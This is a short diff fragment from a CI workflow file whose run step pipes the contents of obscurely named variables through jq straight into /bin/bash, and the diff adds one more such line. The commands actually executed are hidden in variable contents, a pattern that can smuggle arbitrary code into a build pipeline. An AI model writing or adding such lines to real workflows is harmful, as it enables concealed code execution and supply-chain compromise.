@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$q8" | jq -r .rwxl3388 | /bin/bash
           printf '%s' "$qzkzi291" | jq -r .i50 | /bin/bash
+          echo $las7 | jq -r .fa0 | /bin/bash
 
       - name: Store results
         if: always()
